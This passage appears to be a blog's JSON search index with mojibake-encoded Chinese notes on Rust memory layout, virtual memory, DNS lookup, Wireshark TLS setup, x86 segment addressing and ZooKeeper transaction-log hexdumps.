virtual memory address space Memory_Management_in_Linux ","row-format#row format":"","rust-ç¨‹åºå†…å­˜å¸ƒå±€åˆ†æ#rust ç¨‹åºå†…å­˜å¸ƒå±€åˆ†æ":" static MAX: u32 = 0; fn foo() {} fn main() { let hello = \"hello world\".to_string(); let data = Box::new(1); // string literals æŒ‡å‘ RODATA section åœ°å€ println!(\"RODATA: {:p}\", \"hello world!\"); // static å˜é‡åœ¨ DATA section println!(\"DATA: (static var): {:p}\", \u0026MAX); // function åœ¨ TEXT section println!(\"TEXT: (function):{:p}\", foo as *const ()); // string ç»“æ„ä½“åˆ†é…åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥å…¶å¼•ç”¨æ˜¯æŒ‡å‘çš„æ˜¯ä¸€ä¸ªæ ˆåœ°å€ println!(\"STACK: (\u0026hello):{:p}\", \u0026hello); // é€šè¿‡ deference è·å–æŒ‡å‘çš„ heap ä¸Šçš„æ•°æ®ï¼Œç„¶åè·å–å…¶å¼•ç”¨ println!(\"HEAP: (\u0026(*hello)):{:p}\", \u0026(*hello)); // Box å®ç°äº† Pointer trait, æ— é¡»é¢å¤– deference println!(\"HEAP: (Box impl Pointer trait){:p},{:p}\", data, \u0026(data)); } æŸ¥çœ‹å˜é‡åœ¨è™šæ‹Ÿå†…å­˜ä¸­çš„åˆ†å¸ƒ cargo run Compiling stack-or-heap v0.1.0 (/Users/stardust/Downloads/rust-projects/stack-or-heap) Finished dev [unoptimized + debuginfo] target(s) in 0.48s Running `target/debug/stack-or-heap` RODATA: 0x106df1090 DATA: (static var): 0x106df1080 TEXT: (function):0x106db61b0 STACK: (\u0026hello):0x7ff7b9149950 HEAP: (\u0026(*hello)):0x60000346c050 HEAP: (Box impl Pointer trait)0x60000346c060,0x7ff7b9149968 ","stack#stack":"æ ˆåŒºï¼Œä» maps å¯ä»¥çœ‹åˆ° 7ffe91c09000-7ffe91c2a000ï¼Œè¿™ä¸ªåŒºåŸŸæ˜¯è¿™ä¸ªè¿›ç¨‹çš„æ ˆåŒºï¼Œå¯è¯»ã€å¯å†™ã€‚7ffe91c09000 è¿™ä¸ª 48bits çš„åœ°å€å°±æ˜¯è™šæ‹Ÿå†…å­˜åœ°å€ã€‚ä¸ºä»€ä¹ˆæ˜¯ 48bitsï¼Œå› ä¸º amd64 çš„è™šæ‹Ÿåœ°å€ç”¨ 48bits(256TB)åœ°å€ç©ºé—´è¶³å¤Ÿäº†ã€‚","text#text":"ä»£ç æ®µï¼Œç¨‹åºçš„å¯æ‰§è¡Œä»£ç åœ¨è¿™é‡Œã€‚","virtual-memory-address-space-layout#virtual memory address space layout":"","virtual-memory-æ˜¯å•¥#virtual memory æ˜¯å•¥ï¼Ÿ":"virtual memory æ˜¯å•¥ï¼Ÿ æœ¬è´¨æ˜¯ç¡¬ä»¶æ”¯æŒã€‚ virtual memory ===== MMU =====\u003e physical memory OS + ç¡¬ä»¶ å…±åŒä¸ºè¿›ç¨‹æä¾› virtual memory åŠŸèƒ½ã€‚æ‰€æœ‰ç¨‹åºçš„å†…å­˜å¸ƒå±€ä¸€è‡´ã€‚ ä¸ºäº†å®‰å…¨ã€‚ ","ä»£ç æµ‹è¯•#ä»£ç æµ‹è¯•":" cargo new vas-explore main.rs\nuse std::{thread,time}; fn main() { println!(\"Hello, world!\"); let sl = time::Duration::from_millis(10000000); thread::sleep(sl); println!(\"Goodbye, world!\"); } cargo build ./target/debug/vas-explore pidof vas-explore "},"title":"Virtual Memory Address Explore"},"/blog/what-happens-type-url-into-browser-and-press-enter/":{"data":{"":"","arp-è·å–-gateway-çš„-mac-åœ°å€#arp è·å– gateway çš„ mac åœ°å€":"","dns-query#dns query":"get the ip of the target domain\nbrowser cache firefox(about:networking#dns) /etc/hosts os cache macos æŸ¥çœ‹ dns è¯·æ±‚æ—¥å¿— sudo log stream â€“predicate â€˜process == â€œmDNSResponderâ€â€™ â€“info dns resolver /etc/resolv.conf\narp -a æŸ¥çœ‹æœ‰æ²¡æœ‰ dns æœåŠ¡å™¨çš„ mac åœ°å€ ARP request for the nameserver send dns query to get the ip of the domain ","references#References":" keyborad-interrput Chrome æ˜¯æ€ä¹ˆåˆ¤æ–­åœ°å€æ è¾“å…¥çš„ä¸œè¥¿æ˜¯ä¸æ˜¯ç½‘å€? è¿™å°±æ˜¯ç¬¬ä¸€æ­¥ğŸ˜‚-omnibox firefox dns ARP ","å‘-gateway-å‘é€-ip-packet#å‘ gateway å‘é€ ip packet":""},"title":"What-happens-type-url-into-browser-and-press-enter"},"/blog/wireshark/":{"data":{"":"","wireshark-windows-é…ç½®-ssl#Wireshark Windows é…ç½® SSL":" Version 3.0.3\né…ç½® SSLKEYLOGFILE ç³»ç»Ÿå˜é‡ é…ç½® Wireshark ç¼–è¾‘ -\u003e é¦–é€‰é¡¹ -\u003e Protocols -\u003e TLS é‡å¯ Wireshark ","è¿‡æ»¤å™¨æŸ¥çœ‹#è¿‡æ»¤å™¨æŸ¥çœ‹":" è§†å›¾ -\u003e å†…éƒ¨ -\u003e æ”¯æŒçš„åè®®"},"title":"wireshark"},"/blog/x86-64-architecture/":{"data":{"":" æ“ä½œç³»ç»Ÿå…¶å®å¾ˆå¤§ä¸€éƒ¨åˆ†é¢å‘ CPU æ¥ç¼–ç¨‹çš„ã€‚ä¸€äº› OS çš„æ¦‚å¿µç›´æ¥æ¥æºäº CPU çš„æœ¯è¯­ï¼Œæˆ–è€…å’Œ CPU å…³è”æ€§éå¸¸å¤§ã€‚è¦æƒ³å½»åº•ç†è§£ OS ï¼Œæ— æ³•ç»•è¿‡ CPUã€‚å› ä¸º Intel çš„ X86(Intel 80386 ä¹‹åçš„ä¸€ç³»åˆ— CPU ç§°ä¹‹ä¸º X86 æ¶æ„) æ˜¯ä¸šç•Œçš„æ ‡å‡†ã€‚æŒæ¡è¿™ä¸ªæ¶æ„å¯¹äºç†è§£ OS æ˜¯éå¸¸å¿…è¦çš„ã€‚å› ä¸º X86 ç³»åˆ—çš„ CPU å‘åå…¼å®¹ï¼Œæ‰€ä»¥æœ¬æ–‡ä½¿ç”¨ Intel 8086(16 bit) å’Œ Intel 80386(32 bit) æ¥è¯•å›¾ç†è§£ X86 æ¶æ„ã€‚","intel-80386#Intel 80386":"","intel-8086#Intel 8086":"16 bit processor 16-bit is a computer hardware device or software program capable of transferring 16 bits of data at a time. ä¸€æ¬¡ä¼ è¾“ 16 bits çš„æ•°æ® For example, early computer processors (e.g., 8088 and 80286) were 16-bit processors, meaning they were capable of working with 16-bit binary numbers (decimal number up to 65,535). Anything larger and the computer would need to break the number into smaller pieces.\n1M çš„å¯»å€ç©ºé—´å¸¦æ¥çš„é—®é¢˜ä¸è§£å†³æ–¹æ³• Intel 8086 åœ°å€å¼•è„š #(Intel 8086 å¯»å€ç©ºé—´)\nä¸Šå›¾çš„ AD0 ~ AD15 æ˜¯å¤ç”¨(Multiplex)å¼•è„š A16 ~ A19 ä¹Ÿæ˜¯å¤ç”¨å¼•è„š\nALE(Address Latch Enable) = 1 æ˜¯ä½œä¸ºåœ°å€çº¿ A0~A15(å¯»å€) å†åŠ ä¸ŠA16 ~ A19. ALE(Address Latch Enable) = 0 æ˜¯ä½œä¸ºæ•°æ®çº¿ D0~D15(ä¼ è¾“ 16 bit æ•°æ®) ç‰©ç†åœ°å€ç”Ÿæˆ 20 bit æ¥è¡¨ç¤ºä¸€ä¸ªå†…å­˜åœ°å€. ä½†æ˜¯ Intel 8086 æ˜¯ä¸€ä¸ª 16 bit çš„å¤„ç†å™¨(å…¶å®å°±æ˜¯ä¸€æ¬¡åªèƒ½ä¼ è¾“ 16 bit çš„æ•°æ®). æ€æ ·æ¥è¡¨ç¤º 20 bit çš„å†…å­˜åœ°å€å‘¢? æ¯”å¦‚ä¸€ä¸ªå†…å­˜åœ°å€æ˜¯: 0x18AC9, è¯¥æ€æ ·è¡¨ç¤ºå‘¢? å…¶å®é“ç†å¾ˆç®€å•, æ—¢ç„¶æ²¡æ³•ä¸€æ¬¡ä¼ è¾“ 20 bit, é‚£å°±åˆ†ä¸¤æ¬¡å¥½äº†. æœ€åç”¨ä¸¤ä¸ª 16 bit çš„æ•°æ®æ¥åˆæˆ 0x18AC9 è¿™ä¸ªåœ°å€. å¾ˆæ˜¾ç„¶è¦æœ‰ç”Ÿæˆ 0x18AC9 è¿™ä¸ªåœ°å€çš„ç­–ç•¥. åœ¨ Intel 8086 ä¸­, å°† 0x18AC9 æ‹†åˆ†ä¸º 0x1234(segment address) å’Œ 0x6789(offset address) è¿™ä¸¤ä¸ª 16 bit çš„åœ°å€, è¿™å°±æ˜¯æ‰€è°“çš„é€»è¾‘åœ°å€(logical address). æ€æ ·ç”Ÿæˆ 0x18AC9 è¿™ä¸ªçœŸå®çš„ç‰©ç†åœ°å€å‘¢? ä¹Ÿå¾ˆç®€å•ä½¿ç”¨ä¸€ä¸ª 20 bit çš„ adder(åŠ æ³•å™¨). 0x18AC9 = 0x1234 * 16 + 0x6789\nReal Address Mode ç‰©ç†åœ°å€ç”±ä¸¤éƒ¨åˆ†ç»„æˆ: segment address å’Œ offset address. è¿™ä¸¤ä¸ªåœ°å€ä¸èƒ½ç›´æ¥ä½¿ç”¨, æ˜¯ç”¨æ¥åˆæˆçœŸæ­£çš„ç‰©ç†åœ°å€çš„. è¿™ä¸¤ä¸ªåœ°å€ç§°ä¹‹ä¸º é€»è¾‘åœ°å€. 16 * segment address + offset address åˆæˆçš„åœ°å€ç§°ä¹‹ä¸º ç‰©ç†åœ°å€, ä¹Ÿå« çº¿æ€§åœ°å€(ä¹Ÿå°±æ˜¯ä» 0 ~ 2^20 -1 åœ°å€ç©ºé—´). Intel 8086 è¿™ç§å¾—åˆ°ç‰©ç†åœ°å€çš„æœºåˆ¶å°±å«åš real address mode. ä¹Ÿå°±æ˜¯æ‰€è°“çš„ å®æ¨¡å¼. PS: å¤šè¯´ä¸€å¥, å®æ¨¡å¼ è¿™ä¸ªç¿»è¯‘æœ‰ç‚¹å‘, ç¿»è¯‘æˆ å®åœ°å€æ¨¡å¼ ä¸å°±ååˆ†æ¸…æ¥šäº†å—?\nsegmented memory physical address = 16 * segment address + offset address offset address æ˜¯ 16 bit, å†³å®šäº†ä¸€ä¸ª segment çš„èŒƒå›´æ˜¯ 64K. å°† 1M çš„å¯»å€ç©ºé—´ä»¥ 64K ä¸ºä¸€ä¸ª segment åˆ’åˆ†ä¸ºå¤šä¸ª segment. åè¿‡æ¥è¯´å°±æ˜¯ä¸€ä¸ª segment å¯ä»¥é€‰æ‹©ä¸€ä¸ª 64K èŒƒå›´å†…çš„åœ°å€. æ˜¯çš„, segment å¯ä»¥å½“ä½œæ˜¯ä¸€ç§ selector, å°±åƒ CSS é‡Œé¢çš„é€‰æ‹©å™¨. é‚£ä¹ˆè¿™ä¸ª segment å­˜æ”¾åœ¨å“ªé‡Œå‘¢? æ”¾åœ¨ä¸“é—¨çš„ segment register é‡Œ.\nsegment registers Intel 8086 æä¾›äº† Extra Segment(ES), Data Segment(DS), Stack Segment(SS), Code Segment(CS) è¿™ 4 ä¸ª æ®µå¯„å­˜å™¨.\ncode segment(CS) + instruction pointer(IP) code segment å­˜æ”¾ segment address, è¿™æ˜¯ä¸ªä¸“é—¨çš„ä»£ç æ®µå¯„å­˜å™¨, ç”¨æ¥å­˜æ”¾ä»£ç çš„åœ°å€. instruction pointer å­˜æ”¾ offset address, è¿™ä¸ªæ˜¯ä¸“é—¨çš„æŒ‡ä»¤å¯„å­˜å™¨, ç”¨æ¥å­˜æ”¾ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€. æ‰€ä»¥è®¿é—®ä»£ç çš„ ç‰©ç†åœ°å€ = 16 * CS + IP\nstack segment(SS) + stack pointer(SP) stack segment å­˜æ”¾ segment address, è¿™ä¸ªæ˜¯ä¸“é—¨çš„æ ˆå¸§æ®µå¯„å­˜å™¨. stack pointer å­˜æ”¾ offset address, è¿™ä¸ªä¸“é—¨çš„è®°å½•æ ˆé¡¶çš„å¯„å­˜å™¨. æ‰€ä»¥è®¿é—®å‡½æ•°æ ˆå¸§çš„ ç‰©ç†åœ°å€ = 16 * SS + SP\næ³¨æ„: å¦‚æœä»¤ SS = 0, é‚£ä¹ˆè®¿é—®å‡½æ•°æ ˆå¸§çš„ ç‰©ç†åœ°å€ = SP, ä¹Ÿå°±æ˜¯åªèƒ½è®¿é—® 64K çš„ç©ºé—´. æ³¨æ„: real address mode èƒ½å¤Ÿä¸å—é™åˆ¶åœ°è®¿é—® 1M çš„åœ°å€ç©ºé—´. ç¨‹åºå¯ä»¥è‡ªç”±çš„è®¿é—® 1M çš„åœ°å€ç©ºé—´, æ— æ³•è¿›è¡Œå†…å­˜çš„ä¿æŠ¤, è¿™ä¹Ÿæ˜¯ Intel 80386 è¦è§£å†³çš„é—®é¢˜ä¹‹ä¸€.\ngeneral purpose register memory mapping å·²å®‰è£…å†…å­˜ 8G(7.88G) å¯ç”¨ï¼Ÿï¼Ÿï¼ŸåŸå› åœ¨å“ªé‡Œå‘¢ï¼Ÿ","reference#Reference":" bus interface unit execution unit 8086 Functional Units components of cpu 8086-microprocessor-architecture 8086-microprocessor memory-segmentation-8086-microprocessor Advanced Microcomputer Programming 16 bit processor mean? memory layout x86-overview è®¡ç®—æœºä½æ•°å‘å±• "},"title":"x86-64-architecture"},"/blog/zookeeper-transaction-log/":{"data":{"log-äºŒè¿›åˆ¶æ–‡ä»¶å›¾è§£#log äºŒè¿›åˆ¶æ–‡ä»¶å›¾è§£":"\nlog.500000004 æ€ä¹ˆæ¥çš„ï¼Ÿ å¯ä»¥çœ‹åˆ° txn log æ–‡ä»¶ï¼Œå†™å…¥çš„ç¬¬ä¸€ä¸ª transaction çš„ zxid å°±æ˜¯ 0x0000000500000004ã€‚è¿™ä¸ªå°±æ˜¯ log.500000004 çš„ç”±æ¥ã€‚\nä»€ä¹ˆæ˜¯ zxidï¼Ÿ æ–‡ä»¶ç»“æ„ ç¬¬ä¸€è¡Œ FileHeaderã€‚ ç¬¬äºŒè¡Œå¼€å§‹æ˜¯ transaction log, æ¯ä¸€ä¸ª transaction log ç”¨ 0x42 ä½œä¸º EOFã€‚å¯ä»¥çŸ¥é“ log.500000004æœ‰ 6 ä¸ª transactionã€‚ å‰©ä½™çš„æ˜¯ Zero Padã€‚ transaction(txn) ç±»å‹ ä»…åˆ†æ log.500000004ä¸­çš„ 6 ä¸ªã€‚è¿˜æœ‰å…¶ä»–ç±»å‹çš„ txnã€‚\ntransaction ä»£ç ä½ç½® zookeeper-jute ä¸­ org.apache.zookeeper.txn ä¸‹, è¿™ä¸ªæ˜¯ jute compiler ç”Ÿæˆçš„ä¸€ç³»åˆ—ç±»ã€‚\ncreate session txn ç¬¬ 1 ä¸ª txn çš„ type= 0xfffffff6=-10\nOpCode=-10\ncreate txn ç¬¬ 2 ä¸ª txn çš„ type= 0x00000001=1\nOpCode=1\nset data txn ç¬¬ 3ã€4 ä¸ª txn çš„ type= 0x00000005=5\nOpCode=5\ndelete txn ç¬¬ 5 ä¸ª txn çš„ type= 0x00000002=2\nOpCode=2\nclose session txn ç¬¬ 6 ä¸ª txn çš„ type= 0xfffffff5=-11\nOpCode=-11","log500000004-æ–‡ä»¶åˆ†æ#\u003ccode\u003elog.500000004\u003c/code\u003e æ–‡ä»¶åˆ†æ":" åˆ†æçš„ zookeeper ä»£ç ç‰ˆæœ¬ä¸º 3.9.1 ã€‚ zookeer çš„ transaction log ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‡‡ç”¨çš„æ˜¯å¤§ç«¯åºã€‚\nzookeeper æ•°æ®æŒä¹…åŒ–çš„åŠŸèƒ½åœ¨ zookeeper/server/persistence ä¸‹ã€‚\nè§£ææ—¥å¿—å°±å¯ä»¥è·å– zookeeper çš„æ•°æ®ã€‚å¯ä»¥ç”¨æ¥å®ç°å®æ—¶å¤‡ä»½åˆ°å¦ä¸€ä¸ªç‹¬ç«‹çš„ zookeeper é›†ç¾¤ã€‚\næ—¥å¿—æ–‡ä»¶å‘½åè§„åˆ™ /** * Creates a valid transaction log file name. * * @param zxid used as a file name suffix (extension) * @return file name */ public static String makeLogName(long zxid) { return FileTxnLog.LOG_FILE_PREFIX + \".\" + Long.toHexString(zxid); } æ—¥å¿—æ–‡ä»¶å¸ƒå±€ç”± File Headerã€TxnListã€ZeroPad ä¸‰éƒ¨åˆ†æ„æˆ\nlog.500000004 æ–‡ä»¶åˆ†æåˆ†æçš„æ—¥å¿—æ–‡ä»¶ log.500000004","references#References":" zookeeper/server/persistence ZooDefs#OpCode FileTxnLog.java Util#makeLogName log.500000004 zklogtool hexyl-äºŒè¿›åˆ¶åˆ†æå·¥å…· dataLogDir ","äºŒè¿›åˆ¶æ–‡ä»¶æŸ¥çœ‹#äºŒè¿›åˆ¶æ–‡ä»¶æŸ¥çœ‹":" xxd log.500000004.new|head -n 50 00000000: 5a4b 4c47 0000 0002 0000 0000 0000 0000 ZKLG............ 00000010: 0000 0000 eaa1 0b2a 0000 0030 0300 c755 .......*...0...U 00000020: cf61 0000 0000 0000 0000 0005 0000 0004 .a.............. 00000030: 0000 018b 1815 73ab ffff fff6 0000 7530 ......s.......u0 00000040: 0000 0002 0000 000a a5c7 7377 4200 0000 ..........swB... 00000050: 005f 8e12 2a00 0000 5f03 00c7 55cf 6100 ._..*..._...U.a. 00000060: 0000 0000 0100 0000 0500 0000 0500 0001 ................ 00000070: 8b18 159e 3300 0000 0100 0000 0b2f 612f ....3......../a/ 00000080: 7374 6172 6475 7374 ffff ffff 0000 0001 stardust........ 00000090: 0000 001f 0000 0005 776f 726c 6400 0000 ........world... 000000a0: 0661 6e79 6f6e 6500 0000 000d 0000 0002 .anyone......... 000000b0: 0000 000c 6113 4355 4200 0000 0007 0a0e ....a.CUB....... 000000c0: 4000 0000 4c03 00c7 55cf 6100 0000 0000 @...L...U.a..... 000000d0: 0200 0000 0500 0000 0600 0001 8b18 15e5 ................ 000000e0: b800 0000 0500 0000 0b2f 612f 7374 6172 ........./a/star 000000f0: 6475 7374 0000 0009 7468 6553 686f 6775 dust....theShogu 00000100: 6e00 0000 0100 0000 0200 0000 0c14 8609 n............... 00000110: d442 0000 0000 e9ee 12d7 0000 0058 0300 .B...........X.. 00000120: c755 cf61 0000 0000 0003 0000 0005 0000 .U.a............ 00000130: 0007 0000 018b 1816 66ef 0000 0005 0000 ........f....... 00000140: 000b 2f61 2f73 7461 7264 7573 7400 0000 ../a/stardust... 00000150: 1574 6865 3133 4c6f 6164 734f 6654 6865 .the13LoadsOfThe 00000160: 5368 6f67 756e 0000 0002 0000 0002 0000 Shogun.......... 00000170: 000c 39b4 35f7 4200 0000 001a cb0a c700 ..9.5.B......... 00000180: 0000 3b03 00c7 55cf 6100 0000 0000 0500 ..;...U.a....... 00000190: 0000 0500 0000 0800 0001 8b18 167c ed00 .............|.. 000001a0: 0000 0200 0000 0b2f 612f 7374 6172 6475 ......./a/stardu 000001b0: 7374 0000 0002 0000 000b 676d 37e4 4200 st........gm7.B. 000001c0: 0000 00ef 370a d300 0000 3003 00c7 55cf ....7.....0...U. 000001d0: 6100 0000 0000 0000 0000 0500 0000 0900 a............... 000001e0: 0001 8b18 16f9 d4ff ffff f500 0000 0000 ................ 000001f0: 0000 0200 0000 0b67 6d37 e442 0000 0000 .......gm7.B.... 00000200: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000210: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000220: 0000 0000 0000 0000 0000 0000 0000 0000 ................ ","æ—¥å¿—æ–‡ä»¶å‘½åè§„åˆ™#æ—¥å¿—æ–‡ä»¶å‘½åè§„åˆ™":"","æ—¥å¿—æ–‡ä»¶å¸ƒå±€#æ—¥å¿—æ–‡ä»¶å¸ƒå±€":""},"title":"Zookeeper Transaction Log"}}